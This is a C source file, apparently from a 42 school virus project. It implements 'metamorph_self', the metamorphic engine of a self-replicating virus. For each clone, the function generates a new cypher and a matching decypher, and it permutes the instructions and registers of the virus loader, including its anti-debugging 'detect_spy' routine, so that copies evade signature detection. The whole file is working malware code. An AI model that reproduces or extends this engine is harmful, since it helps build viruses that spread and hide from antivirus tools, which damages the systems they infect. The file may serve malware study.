/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   metamorph_self.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
/*   Updated: 2020/01/13 20:42:57 by spolowy          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "accessors.h"
#include "polymorphism.h"
#include "errors.h"
#include "loader.h"

/*
** metamorph_self is a metamorphic generator for the virus loader.
**   It generates a new cypher method for the virus
**   Generates a paired decypher for the clone's loader
**   And applies various permutations on the clone's loader code
**
**   Some parts of the loader can't be reg-permutated because of
**   syscall calling conventions.
*/

bool		metamorph_self(struct safe_ptr clone, size_t loader_off, \
			uint64_t son_seed[2], uint64_t client_id)
{
	// generate new seed
	uint64_t unique_seed = polymorphic_seed_engine(son_seed, client_id);

	// get loader chunk sizes
	size_t	cypher_size        = (size_t)cypher_end - (size_t)cypher;
	size_t	loader_size        = loader_exit - loader_entry;
	size_t	wrap_mprotect_size = wrap_mprotect_end - wrap_mprotect;
	size_t	detect_spy_size    = (size_t)detect_spy_end - (size_t)detect_spy;

	// get client loader offsets
	size_t	loader_entry_off  = loader_off;
	size_t	decypher_off      = loader_off + (size_t)decypher - (size_t)loader_entry;
	size_t	wrap_mprotect_off = loader_off + (size_t)wrap_mprotect - (size_t)loader_entry;
	size_t	detect_spy_off    = loader_off + (size_t)detect_spy - (size_t)loader_entry;

	// get client loader pointers
	void	*clone_decypher      = safe(clone, decypher_off, cypher_size);
	void	*clone_loader_entry  = safe(clone, loader_entry_off, loader_size);
	void	*clone_wrap_mprotect = safe(clone, wrap_mprotect_off, wrap_mprotect_size);
	void	*clone_detect_spy    = safe(clone, detect_spy_off, detect_spy_size);

	if (!clone_decypher || !clone_loader_entry
	|| !clone_wrap_mprotect || !clone_detect_spy)
		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	// metamorph self and client
	if (!generate_cypher(cypher, unique_seed, cypher_size)
	|| !generate_decypher(clone_decypher, unique_seed, cypher_size)
	|| !permutate_instructions(clone_loader_entry, unique_seed, loader_size)
	|| !permutate_registers(clone_loader_entry, unique_seed, loader_size)
	|| !permutate_instructions(clone_wrap_mprotect, unique_seed, wrap_mprotect_size)
	|| !permutate_instructions(clone_detect_spy, unique_seed, detect_spy_size)
	|| !permutate_instructions(clone_decypher, unique_seed, cypher_size)
	|| !true)
		return errors(ERR_THROW, _ERR_METAMORPH_SELF);

	return true;
}
